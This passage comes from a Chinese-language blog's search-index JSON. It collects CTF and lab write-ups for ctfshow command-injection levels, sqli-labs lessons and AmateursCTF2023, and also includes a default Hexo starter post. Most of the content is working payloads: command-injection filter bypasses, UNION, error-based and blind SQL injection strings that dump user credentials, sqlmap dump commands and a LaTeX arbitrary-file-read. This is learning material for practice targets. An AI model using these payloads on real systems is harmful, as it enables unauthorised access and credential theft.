class=\"line\">同C、C++语言逻辑运算符&quot;&amp;&amp;&quot;类似，遇到首个命令执行失败后，后面的命令不会执行。如：</span><br><span class=\"line\">输入：命令A &amp;&amp; 命令B &amp;&amp; 命令C</span><br><span class=\"line\">先执行命令A，若A命令执行正确则再执行命令B。假如命令B执行失败，则停止，C命令不会被执行到。</span><br><span class=\"line\">3、“||”分隔符</span><br><span class=\"line\">同C、C++语言逻辑运算符&quot;||&quot;类似，遇到首个命令执行成功后，后面的命令不会执行。如：</span><br><span class=\"line\">输入：命令A || 命令B || 命令C</span><br><span class=\"line\">先执行命令A，若A命令执行失败则再执行命令B。假如命令B执行成功，则停止，C命令不会被执行到。</span><br></pre></td></tr></table></figure>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?c=tac flag.php||ls</span><br></pre></td></tr></table></figure>\n<h1 id=\"web44\"><a href=\"#web44\" class=\"headerlink\" title=\"web44\"></a>web44</h1><p><img src=\"/pic/web44.png\" alt=\"img\"><br>flag也过滤了，就用通配符呗。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=tac fl*||ls</span><br></pre></td></tr></table></figure>\n<p>常见的通配符有<code>*</code>、<code>?</code>。</p>\n","categories":["web","ctfshow","刷题"],"tags":["ctfshow","刷题","web"]},{"title":"ctfshow 刷题web45~52","url":"/2023/01/17/ctfshow-%E5%88%B7%E9%A2%98web45~52/","content":"<h1 id=\"web45\"><a href=\"#web45\" class=\"headerlink\" title=\"web45\"></a>web45</h1><p><img src=\"/pic/45.png\" alt=\"img\"><br>过滤了空格，用<code>%09</code>绕过，&amp;&amp;等于;，也可以用<code>||</code>和<code>%0a</code>。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=tac%09fl*||</span><br><span class=\"line\">/?c=sort%09fl*||</span><br><span class=\"line\">/?c=echo%09`tac%09fla*`||</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<h1 id=\"web46\"><a href=\"#web46\" class=\"headerlink\" title=\"web46\"></a>web46</h1><p><img src=\"/pic/46.png\" alt=\"img\"><br>多过滤了一些字符，但还是可以%<code>09</code>过滤空格，因为<code>%09</code>解码后就不是数字了，是一个水平制表符。<br><code>*</code>被过滤了，可以用<code>?</code><br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=tac%09fla?.php||</span><br><span class=\"line\">/?c=nl&lt;fla&#x27;&#x27;g.php|| nl查看源代码，&lt;代替空格，&#x27;&#x27;分割flag过滤，||解决命令黑洞</span><br></pre></td></tr></table></figure>\n<h1 id=\"web47\"><a href=\"#web47\" class=\"headerlink\" title=\"web47\"></a>web47</h1><p><img src=\"/pic/47.png\"><br>无非就是sort无法用了，上一题的payload还可以用。</p>\n<h1 id=\"web48\"><a href=\"#web48\" class=\"headerlink\" title=\"web48\"></a>web48</h1><p><img src=\"/pic/48.png\"><br>上一题的payload依然可以用。</p>\n<h1 id=\"web49\"><a href=\"#web49\" class=\"headerlink\" title=\"web49\"></a>web49</h1><p><img src=\"/pic/49.png\"><br>依然可以用。</p>\n<h1 id=\"web50\"><a href=\"#web50\" class=\"headerlink\" title=\"web50\"></a>web50</h1><p><img src=\"/pic/50.png\"><br><code>%09</code>过滤了，<code>&lt;&gt;</code>和<code>?</code>一起使用时没有回显,所以这里的<code>?</code>可以用<code>\\</code>和<code>&#39;&#39;</code>进行代替,。<br>paylaod:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=tac&lt;fla\\g.php||</span><br><span class=\"line\">/?c=nl&lt;fla&#x27;&#x27;g.php||</span><br></pre></td></tr></table></figure>\n<h1 id=\"web51\"><a href=\"#web51\" class=\"headerlink\" title=\"web51\"></a>web51</h1><p><img src=\"/pic/51.png\"><br>tac被过滤了，只能用nl。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?c=nl&lt;fla\\g.php||</span><br></pre></td></tr></table></figure>\n<h1 id=\"web52\"><a href=\"#web52\" class=\"headerlink\" title=\"web52\"></a>web52</h1><p><img src=\"/pic/52.png\"><br>&lt;&gt;也被过滤了，还可以用<code>$IFS</code><br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=nl$&#123;IFS&#125;fla\\g.php||</span><br></pre></td></tr></table></figure>","categories":["web","ctfshow","刷题"],"tags":["ctfshow","刷题","web"]},{"title":"Hello World","url":"/2023/02/26/hello-world/","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n"},{"title":"sqli-labs","url":"/2023/02/20/sqli-labs/","content":"<h1 id=\"less-1\"><a href=\"#less-1\" class=\"headerlink\" title=\"less-1\"></a>less-1</h1><p><img src=\"/pic/sqli/1.png\"><br>看报错可知，这是闭合单引号。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id=1&#x27;order by 3 -- - #确定那个字段有回显</span><br><span class=\"line\">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- - #查询表名</span><br><span class=\"line\">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- -  #查询列名</span><br><span class=\"line\">?id=-1&#x27;union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users -- - #查询当前数据库user表里面的username和password。</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<p>用sqlmap更简单</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;ip?id=1&quot;</span><br><span class=\"line\">sqlmap -u &quot;ip?id=1&quot; -dbs #列出所有数据库</span><br><span class=\"line\">sqlmap -u &quot;ip?id=1&quot; -D security -tables #列出当前数据库里的表</span><br><span class=\"line\">sqlmap -u &quot;ip?id=1&quot; -D security -T users -columns #列出表里的列</span><br><span class=\"line\">sqlmap -u &quot;ip?id=1&quot; -D security -T users -C username,password --dump #获取表里的数据</span><br></pre></td></tr></table></figure>\n<h1 id=\"less-2\"><a href=\"#less-2\" class=\"headerlink\" title=\"less-2\"></a>less-2</h1><p><img src=\"/pic/sqli/2.png\"><br>这一题就不用闭合，剩下的和第一题一样。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id=1 order by 3 -- - </span><br><span class=\"line\">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- -</span><br><span class=\"line\">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- - </span><br><span class=\"line\">?id=-1 union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users -- - </span><br></pre></td></tr></table></figure>\n<h1 id=\"less-3\"><a href=\"#less-3\" class=\"headerlink\" title=\"less-3\"></a>less-3</h1><p><img src=\"/pic/sqli/3.png\"><br>看错误提示可知，需要用<code>&#39;)</code>来闭合，剩下的和第一题一样。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id=1&#x27;) order by 3 -- - </span><br><span class=\"line\">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- -</span><br><span class=\"line\">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- - </span><br><span class=\"line\">?id=-1&#x27;) union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users -- - </span><br></pre></td></tr></table></figure>\n<h1 id=\"less-4\"><a href=\"#less-4\" class=\"headerlink\" title=\"less-4\"></a>less-4</h1><p><img src=\"/pic/sqli/4.png\"><br>看错误提示，可知闭合方式是<code>&quot;)</code>，但是单引号不会报错,剩下的和第一题一样。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id=1&quot;) order by 3 -- - </span><br><span class=\"line\">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- -</span><br><span class=\"line\">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- - </span><br><span class=\"line\">?id=-1&quot;) union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users -- - </span><br></pre></td></tr></table></figure>\n<h1 id=\"less-5\"><a href=\"#less-5\" class=\"headerlink\" title=\"less-5\"></a>less-5</h1><p><img src=\"/pic/sqli/5.png\"><br>根据错误可以判断是单引号报错。联合注入也没有办法用，可以使用报错注入。<br>extractvalue函数<br>payload:id=’and(select extractvalue(“anything”,concat(‘~’,(select语句))))</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">函数原型：extractvalue(xml_document,Xpath_string)</span><br><span class=\"line\">正常语法：extractvalue(xml_document,Xpath_string);</span><br><span class=\"line\">第一个参数：xml_document是string格式，为xml文档对象的名称</span><br><span class=\"line\">第二个参数：Xpath_string是xpath格式的字符串</span><br><span class=\"line\">作用：从目标xml中返回包含所查询值的字符串</span><br></pre></td></tr></table></figure>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,(select database()))))-- - #获取当前数据库的名称</span><br><span class=\"line\">?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31))))-- -</span><br><span class=\"line\">#查询当前数据库里所有的表</span><br><span class=\"line\">?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,31))))-- -</span><br><span class=\"line\">#查询表里列的名称</span><br><span class=\"line\">?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,substr((select group_concat(username,&#x27;~&#x27;,password) from users),1,31))))-- -</span><br><span class=\"line\">#查询表里面的内容</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># extractvalue()函数能显示的最大长度为32，所以用substr()函数来分页，或者使用limit分页也可以。concat()里面的~也可以是其他的。</span><br></pre></td></tr></table></figure>\n\n<p>updatexml:<br>payload:id=’and(select updatexml(“anything”,concat(‘~’,(select语句())),”anything”))</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id=-1&#x27;and updatexml(1,concat(&#x27;~&#x27;,(select database())),1)-- -</span><br><span class=\"line\">?id=-1&#x27;and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(table_name)from information_schema.tables where table_schema=database() )),1)-- -</span><br><span class=\"line\">?id=-1&#x27;and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; )),1)-- -</span><br><span class=\"line\">?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,substr((select group_concat(username,&#x27;~&#x27;,password) from users),1,31))))-- -</span><br></pre></td></tr></table></figure>\n\n<p>floor:<br>payload:’union select 1 from (select count(*),concat((slelect语句),floor(rand(0)*2))x from “一个足大的表” group by x)a</p>\n<h1 id=\"less-6\"><a href=\"#less-6\" class=\"headerlink\" title=\"less-6\"></a>less-6</h1><p>闭合方式为<code>&quot;</code>，报错注入仍可行。</p>\n<h1 id=\"less-7\"><a href=\"#less-7\" class=\"headerlink\" title=\"less-7\"></a>less-7</h1><p>文件读写注入，但是我怎么运行文件都不写入，放弃了。</p>\n<h1 id=\"less-8\"><a href=\"#less-8\" class=\"headerlink\" title=\"less-8\"></a>less-8</h1><p>布尔盲注。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id=-1&#x27;and (ascii(substr(select database()),1,1))==115--+ #判断第一个数据库名字第一个字符的ascii码是否等于115</span><br><span class=\"line\">?id=1&#x27; and (ascii(substr((select database()) ,2,1))) = 101 --+ #判断第一个数据库名字第二个字符的ascii码是否等于101</span><br><span class=\"line\">?id=1&#x27;and (length(database())) = 8 --+ #判断数据库名字的长度是否等于8</span><br><span class=\"line\">?id=1&#x27;and (length(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1)) = 5 --+ #判断地三张表名字的长度是否为5</span><br><span class=\"line\">?id=1&#x27; and (length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1))) = 8 --+ #判断users表里地二个列名的长度是否为8</span><br></pre></td></tr></table></figure>\n<p>如果判断正确的话，页面返回正常。<br>好麻烦啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊。</p>\n<h1 id=\"less-9\"><a href=\"#less-9\" class=\"headerlink\" title=\"less-9\"></a>less-9</h1><p>时间盲注</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">id=1&#x27; and if(length(database())&gt;3 ,sleep(5),1) -- - #如果数据库长度长于3的话，延迟5秒返回页面。</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.cnblogs.com/forforever/p/13019703.html\">MySQL时间盲注五种延时方法 </a></p>\n<h1 id=\"less-10\"><a href=\"#less-10\" class=\"headerlink\" title=\"less-10\"></a>less-10</h1><p>还是时间盲注，闭合方式为<code>&quot;</code>。</p>\n<h1 id=\"less-11\"><a href=\"#less-11\" class=\"headerlink\" title=\"less-11\"></a>less-11</h1><p><img src=\"/pic/sqli/11.png\"><br>这个就在username上直接输入sql语句就行。<br>也可以用hackbar，Post传参。其他语句不变。.</p>\n","categories":["web"],"tags":["sql注入"]},{"title":"AmateursCTF2023","url":"/2023/07/19/AmateursCTF2023/","content":"<h1 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h1><h2 id=\"waiting-an-eternity\"><a href=\"#waiting-an-eternity\" class=\"headerlink\" title=\"waiting-an-eternity\"></a>waiting-an-eternity</h2><p><img src=\"/pic/AmateursCTF/web1.png\"></p>\n<p>看文件头，要等好长事件之后才会刷新,直接访问后面的url</p>\n<p><img src=\"/pic/AmateursCTF/web2.png\"></p>\n<p>secretcode是md5解密，但是没什么用，Cookie里有<code>time</code>是时间戳将他改成<code>NAN</code>显示flag</p>\n<p><img src=\"/pic/AmateursCTF/web3.png\"></p>\n<h2 id=\"funny-factorials\"><a href=\"#funny-factorials\" class=\"headerlink\" title=\"funny factorials\"></a>funny factorials</h2><p>附件给了一个app.py</p>\n<p>可控点在这里，通过改变主题得到flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">def filter_path(path):</span><br><span class=\"line\">    # print(path)</span><br><span class=\"line\">    path = path.replace(&quot;../&quot;, &quot;&quot;)</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        return filter_path(path)</span><br><span class=\"line\">    except RecursionError:</span><br><span class=\"line\">        # remove root / from path if it exists</span><br><span class=\"line\">        if path[0] == &quot;/&quot;:</span><br><span class=\"line\">            path = path[1:]</span><br><span class=\"line\">        print(path)</span><br><span class=\"line\">        return path</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>将path里面的<code>../</code>删掉了，如果path开头是<code>/</code>会忽视掉，但是如果递归超过1000次就会进入<code>RecursionError</code>然后访问根目录下的flag.txt就行</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST /?themeflag.txt</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"latek\"><a href=\"#latek\" class=\"headerlink\" title=\"latek\"></a>latek</h2><p>关于latek可以看看这篇文章<a href=\"https://www.freebuf.com/articles/security-management/308191.html\">https://www.freebuf.com/articles/security-management/308191.html</a></p>\n<p><img src=\"/pic/AmateursCTF/web4.png\"></p>\n<p>直接用\\input的话flag输出不完全，问了chatgpt可以用其他方法进行任意文件读取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">\\documentclass&#123;article&#125;</span><br><span class=\"line\">\\usepackage&#123;verbatim&#125;</span><br><span class=\"line\">\\begin&#123;document&#125;</span><br><span class=\"line\">Hello, world!</span><br><span class=\"line\">\\verbatiminput&#123;/flag.txt&#125;</span><br><span class=\"line\">\\end&#123;document&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"REV\"><a href=\"#REV\" class=\"headerlink\" title=\"REV\"></a>REV</h1><h2 id=\"volcano\"><a href=\"#volcano\" class=\"headerlink\" title=\"volcano\"></a>volcano</h2><p>ida分析，先看main函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v4; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  __int64 v5; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  __int64 v6; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v7; <span class=\"comment\">// [rsp+8h] [rbp-C8h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v8; <span class=\"comment\">// [rsp+10h] [rbp-C0h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v9; <span class=\"comment\">// [rsp+18h] [rbp-B8h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v10; <span class=\"comment\">// [rsp+20h] [rbp-B0h]</span></span><br><span class=\"line\">  FILE *stream; <span class=\"comment\">// [rsp+28h] [rbp-A8h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> s[<span class=\"number\">136</span>]; <span class=\"comment\">// [rsp+30h] [rbp-A0h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v13; <span class=\"comment\">// [rsp+B8h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v13 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stderr</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Give me a bear: &quot;</span>);</span><br><span class=\"line\">  v7 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%llu&quot;</span>, &amp;v7);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !sub_12BB(v7) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;That doesn&#x27;t look like a bear!&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Give me a volcano: &quot;</span>);</span><br><span class=\"line\">    v8 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    __isoc99_scanf(<span class=\"string\">&quot;%llu&quot;</span>, &amp;v8);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)sub_13D9(v8) != <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;That doesn&#x27;t look like a volcano!&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Prove to me they are the same: &quot;</span>);</span><br><span class=\"line\">      v9 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">      v10 = <span class=\"number\">4919LL</span>;</span><br><span class=\"line\">      __isoc99_scanf(<span class=\"string\">&quot;%llu&quot;</span>, &amp;v9);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (v9 &amp; <span class=\"number\">1</span>) != <span class=\"number\">0</span> &amp;&amp; v9 != <span class=\"number\">1</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v4 = sub_1209(v8);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v4 == sub_1209(v7)</span><br><span class=\"line\">          &amp;&amp; (v5 = sub_124D(v8), v5 == sub_124D(v7))</span><br><span class=\"line\">          &amp;&amp; (v6 = sub_1430(v10, v8, v9), v6 == sub_1430(v10, v7, v9)) )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;That looks right to me!&quot;</span>);</span><br><span class=\"line\">          stream = fopen(<span class=\"string\">&quot;flag.txt&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">          fgets(s, <span class=\"number\">128</span>, stream);</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(s);</span><br><span class=\"line\">          <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Nope that&#x27;s not right!&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;That&#x27;s not a valid proof!&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>先看<code>sub_12BB</code>和<code>sub_13D9</code>这两个</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">_BOOL8 __fastcall <span class=\"title function_\">sub_12BB</span><span class=\"params\">(<span class=\"type\">unsigned</span> __int64 a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (a1 &amp; <span class=\"number\">1</span>) != <span class=\"number\">0</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a1 % <span class=\"number\">3</span> != <span class=\"number\">2</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a1 % <span class=\"number\">5</span> != <span class=\"number\">1</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a1 % <span class=\"number\">7</span> == <span class=\"number\">3</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a1 % <span class=\"number\">109</span> == <span class=\"number\">55</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">_BOOL8 __fastcall sub_13D9(unsigned __int64 a1)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  unsigned __int64 v2; // [rsp+8h] [rbp-10h]</span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = 0LL;</span><br><span class=\"line\">  while ( a1 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v2 += a1 &amp; 1;</span><br><span class=\"line\">    a1 &gt;&gt;= 1;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return v2 &gt; 16 &amp;&amp; v2 &lt;= 26;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>逻辑很简单，写脚本爆破一下就行</p>\n<p>看后面</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">if ( v4 == sub_1209(v7)</span><br><span class=\"line\">         &amp;&amp; (v5 = sub_124D(v8), v5 == sub_124D(v7))</span><br><span class=\"line\">         &amp;&amp; (v6 = sub_1430(v10, v8, v9), v6 == sub_1430(v10, v7, v9)) )</span><br></pre></td></tr></table></figure>\n\n<p>前几个完全没用只用考虑最后一个括号里的内容就行。</p>\n<p>sub_1430:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 __fastcall <span class=\"title function_\">sub_1430</span><span class=\"params\">(<span class=\"type\">unsigned</span> __int64 a1, <span class=\"type\">unsigned</span> __int64 a2, <span class=\"type\">unsigned</span> __int64 a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+10h] [rbp-18h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v6; <span class=\"comment\">// [rsp+20h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v6 = <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  v5 = a1 % a3;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( a2 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (a2 &amp; <span class=\"number\">1</span>) != <span class=\"number\">0</span> )</span><br><span class=\"line\">      v6 = v5 * v6 % a3;</span><br><span class=\"line\">    a2 &gt;&gt;= <span class=\"number\">1</span>;</span><br><span class=\"line\">    v5 = v5 * v5 % a3;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v6;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>直接写脚本爆破就行了</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check1</span>(<span class=\"params\">a1</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> a1 &amp; <span class=\"number\">1</span> != <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> a1 % <span class=\"number\">3</span> != <span class=\"number\">2</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> a1 % <span class=\"number\">5</span> != <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> a1 % <span class=\"number\">7</span> == <span class=\"number\">3</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> a1 % <span class=\"number\">109</span> == <span class=\"number\">55</span></span><br><span class=\"line\">    <span 